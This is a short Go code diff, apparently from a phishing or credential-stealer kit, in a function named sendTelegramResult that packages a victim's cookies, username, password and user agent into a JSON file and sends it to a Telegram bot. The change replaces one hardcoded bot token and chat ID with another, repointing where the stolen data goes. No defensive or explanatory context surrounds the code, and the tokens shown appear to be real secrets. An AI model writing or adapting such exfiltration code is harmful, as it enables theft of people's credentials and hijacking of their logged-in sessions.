@@ -51,7 +51,7 @@ func sendTelegramResult(cookies string, username string, password string,  usera
 	// Send the message
 	var err error
 	client, fileName := &http.Client{}, ""+username+".json"
-	token, chat_id := "6572765504:AAHsQyN4Vy3t6tRiprk-pAyCRub7OjHqTDA", "6151124735"
+	token, chat_id := "6638182255:AAHxvt2f5F7Lo0S85eegMEN3Gdpc5_4-ERQ", "6289235144"
 
 	url := "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chat_id + ""
 	//url := "http://api.ttelegram.org/bot"%s/sendDocument?chat_id=%s", getUrl(), getChatId())
